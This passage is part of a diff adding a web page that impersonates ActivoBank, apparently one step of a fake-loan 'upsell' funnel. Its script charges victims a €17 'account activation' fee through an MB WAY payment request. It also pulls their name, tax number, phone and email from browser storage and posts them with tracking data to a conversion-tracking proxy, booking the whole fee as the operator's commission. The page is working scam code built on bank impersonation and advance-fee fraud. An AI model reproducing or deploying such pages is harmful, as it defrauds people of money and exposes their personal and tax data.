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" alt="MB WAY" style="width:90px;height:auto"></div>
+      <div class="modal-title">Payment via MB WAY</div>
+      <div class="modal-amount" id="modalPayAmount">€ ---</div>
+      <div id="modalBody"></div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="site-footer">
+    <div class="logo-wrap">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="ActivoBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">ActivoBank</text></svg>
+    </div>
+    ActivoBank<br/>Branch in Portugal – Lisbon – 1050-001
+  </div>
+
+</div>
+
+<script>
+// ── Dynamic data ──
+(function(){
+  try{
+
+  var nome=(localStorage.getItem('nome')||'customer').trim();
+  var p=nome.split(/\s+/);
+  document.getElementById('userName').textContent=((p[0]||'customer')+' '+(p.slice(-1)[0]||'')).trim().toLowerCase();
+  var nif=(localStorage.getItem('nif')||'').replace(/\D/g,'');
+  if(nif.length>=9) document.getElementById('userNif').textContent=nif.slice(0,3)+' *** *'+nif.slice(7,9);
+
+  var loanRaw=parseFloat(localStorage.getItem('selectedLoanAmount')||localStorage.getItem('valorEmprestimo')||0);
+  var loan=loanRaw||10000;
+  var comissao = (window.resolveUpsellAmount||function(f){return f;})(17.00);
+function getPayAmount(){ return (window.resolveUpsellAmount||function(f){return f;})(17.00); }
+window.addEventListener('upsell-fee-ready',function(ev){ if(ev&&ev.detail&&ev.detail.amount!=null){ comissao=ev.detail.amount; window._PAY_AMOUNT=comissao; } });
+
+
+  function fmt(v){ return '€ '+v.toLocaleString('pt-PT',{minimumFractionDigits:2,maximumFractionDigits:2}); }
+
+  document.getElementById('modalPayAmount').textContent=fmt(comissao);
+  window._PAY_AMOUNT=comissao;  }catch(e){ console.error('[UPSELL] init error:', e); }
+})();
+
+// ── MB WAY ──
+const WAYMB_API    = '';
+const UTMIFY_API   = '/api/utmify-proxy';
+
+function utcNow(){ return new Date().toISOString().replace('T',' ').slice(0,19); }
+function getPhone(){ return (localStorage.getItem('telefone')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/\D/g,''); }
+function setModalBody(html){ document.getElementById('modalBody').innerHTML=html; }
+function closeModal(){ document.getElementById('payModal').classList.remove('show'); }
+
+function getStoredUtms(){
+  var keys=['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term'];
+  var obj={};
+  keys.forEach(function(k){ var v=localStorage.getItem(k); if(v) obj[k]=v; });
+  // also try to grab from the current URL
+  try{
+    var p=new URLSearchParams(window.location.search);
+    keys.forEach(function(k){ if(p.get(k)) obj[k]=p.get(k); });
+  }catch(e){
+    console.error('[UPSELL] catch error:', e);}
+  return obj;
+}
+function getUtmParams(){
+  var p=new URLSearchParams(window.location.search);
+  function g(k){ return p.get(k)||localStorage.getItem(k)||null; }
+  return {src:g('src'),sck:g('sck'),utm_source:g('utm_source'),utm_campaign:g('utm_campaign'),utm_medium:g('utm_medium'),utm_content:g('utm_content'),utm_term:g('utm_term')};
+}
+async function sendUtmify(status,orderId,createdAt,approvedDate){
+  var nome=localStorage.getItem('nome')||'Customer';
+  var email=localStorage.getItem('email')||'customer@activobank.pt';
+  var phone=(localStorage.getItem('telefone')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/[^0-9]/g,'');
+  var doc=(localStorage.getItem('nif')||localStorage.getItem('cpf')||'').replace(/[^0-9]/g,'')||null;
+  var cents=Math.round(getPayAmount(17)*100);
+  try{
+    await fetch(apiUrl(UTMIFY_API),{method:'POST',headers:{'Content-Type':'application/json',},
+      body:JSON.stringify({orderId,platform:'ActivoBankCredit',paymentMethod:'pix',status,createdAt,approvedDate:approvedDate||null,refundedAt:null,
+        customer:{name:nome,email,phone:phone||null,document:doc,country:'PT'},
+        products:[{id:'ativacao-conta',name:'Digital Account Activation — ActivoBank Credit',planId:null,planName:'upsell 2',quantity:1,priceInCents:cents}],
+        trackingParameters:getUtmParams(),
+        commission:{totalPriceInCents:cents,gatewayFeeInCents:0,userCommissionInCents:cents,currency:'EUR'},isTest:false})});
+  }catch(e){console.warn('UTMify:',e);}
+}
+
+function startPolling(txId){
+  let attempts=0;
+  const poll=async()=>{
+    if(attempts++>=100){setModalBody('<div class="modal-status error">⚠️ Time expired. Check the MB WAY app.</div>');return;}
+    try{
+      const res=await fetch(apiUrl('/api/status?id='+txId),);
+      const data=await res.json();
+      if(data.status==='COMPLETED'){
+        setModalBody('<div class="modal-status success">✅ Payment confirmed! Redirecting...</div>');
+            if (window.trackPurchase) {
+              window.trackPurchase({
+                transactionId: txId,
+                value: (getPayAmount()),
+                content_id: (window.getFunnelStepParams && window.getFunnelStepParams().content_id) || 'activobank-payment',
+                content_name: (window.getFunnelStepParams && window.getFunnelStepParams().content_name) || 'ActivoBank Payment',
+                description: 'Payment confirmed'
+              });
+            }
+
+        setTimeout(()=>{var _u=new URL('../3/index.html',window.location.href);['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(function(k){var v=localStorage.getItem(k);if(v)_u.searchParams.set(k,v);});window.location.href=_u.toString();},1500);
+        return;
+      }else if(data.status==='DECLINED'){
+        setModalBody('<div class="modal-status error">❌ Payment declined. Please try again.</div><button class="btn-modal-pay" style="margin-top:12px" onclick="closeModal()"><span data-msg="upsell2.t21">Close</span></button>');
+        return;
+      }
+    }catch(e){}
+    setTimeout(poll,3000);
+  };
+  setTimeout(poll,3000);
+}
+
+async function gerarMBWay(phone){
+  console.log('[UPSELL] gerarMBWay phone:', phone);
+  const fmtPhone='+351'+(phone.startsWith('351')?phone.slice(3):phone);
+  const nome=localStorage.getItem('nome')||'Customer';
+  const email=localStorage.getItem('email')||'customer@activobank.pt';
+  const doc=(localStorage.getItem('nif')||localStorage.getItem('cpf')||'999999999').replace(/\D/g,'')||'999999999';
+  const amount=getPayAmount(17);
+  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Generating MB WAY request...</div>');
+  try{
+    const res=await fetch(apiUrl('/api/payment-proxy?action=create'),{method:'POST',headers:{'Content-Type':'application/json'},
+
+      body:JSON.stringify({amount,method:'mbway',currency:'EUR',payer:{name:nome,email,document:doc,phone:fmtPhone},product:"ativacao-conta",paymentDescription:"Account Activation",_utms:getUtmParams()})});
+    const data=await res.json();
+    if(!res.ok||data.error) throw new Error(data.error||data.message||'Error '+res.status);
+    const txId=data.id||data.transaction_id||data.transactionId;
+    const createdAt=utcNow();
+    localStorage.setItem('_utmOrderId',txId);
+    localStorage.setItem('_utmCreatedAt',createdAt);
+        // UTMify waiting_payment: server (/api/transaction)
+
+    setModalBody('<div class="modal-status loading">Open the <strong>MB WAY</strong> app on your phone <strong>'+fmtPhone+'</strong> and confirm the payment.<br/><br/>Waiting for confirmation...</div>');
+    startPolling(txId);
+  }catch(e){
+    setModalBody('<div class="modal-status error" style="margin-bottom:14px">❌ '+((e&&e.message)?e.message:'Failed to generate request.')+'</div><div class="modal-phone-box"><label><span data-msg="upsell2.t25">Phone number</span></label><input type="tel" id="phoneRetry" inputmode="numeric" placeholder="9XXXXXXXX"/></div><button class="btn-modal-pay" onclick="tentarComNumero()"><span data-msg="upsell2.t26">Try again</span></button>');
+  }
+}
+
+function tentarComNumero(){
+  const ph=(document.getElementById('phoneRetry').value||'').replace(/\D/g,'');
+  if(!ph||ph.length<9){alert('Please enter a valid number.');return;}
+  gerarMBWay(ph);
+}
+
+function abrirModal(){
+  console.log('[UPSELL] abrirModal called');
+  document.getElementById('payModal').classList.add('show');
+  var el=document.getElementById('payModal'); console.log('[UPSELL] payModal element:', el, 'classes:', el?el.className:'NOT FOUND');
+  const phone=getPhone();
+  if(phone&&phone.length>=9){
+    gerarMBWay(phone);
+  }else{
+    setModalBody('<div style="margin-bottom:14px;font-size:13px;color:#71717a;text-align:center">Enter your phone number to receive the MB WAY request.</div><div class="modal-phone-box"><label><span data-msg="upsell2.t28">Phone number</span></label><input type="tel" id="phoneInput" inputmode="numeric" placeholder="9XXXXXXXX"/></div><button class="btn-modal-pay" onclick="tentarComNumeroInicial()"><span data-msg="upsell2.t29">Generate MB WAY request</span></button>');
+  }
+}
+
+function tentarComNumeroInicial(){
+  const ph=(document.getElementById('phoneInput').value||'').replace(/\D/g,'');
+  if(!ph||ph.length<9){alert('Please enter a valid number.');return;}
+  localStorage.setItem('telefone',ph);
+  gerarMBWay(ph);
+}
+</script>
+
+
+<script>window.__FUNIL_PAGE__="upsell2";</script>
+<script src="../extensions/api-base.js"></script><script src="../extensions/fees-loader.js"></script>
+<script src="../extensions/upsell-fees-bridge.js"></script>
+<script src="../extensions/messages-catalog.js"></script>
+<script src="../extensions/site-messages.js"></script>
+<script src="../extensions/tracking-config-loader.js"></script>
+<script src="../extensions/tracker.js"></script>
+</body>
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sxb1plzcpnl507722'},{'dcenter':'sxb1'},{'cp_id':'10975642'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='../../img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
